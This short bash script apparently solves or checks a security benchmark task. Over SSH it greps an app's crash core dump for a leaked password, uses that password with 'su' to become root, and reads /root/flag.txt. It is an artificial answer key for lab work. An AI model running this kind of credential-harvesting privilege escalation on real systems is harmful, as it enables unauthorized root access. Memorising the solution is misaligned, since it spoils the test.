#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'grep -q "password" /var/crash/bench-app.core && echo password | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
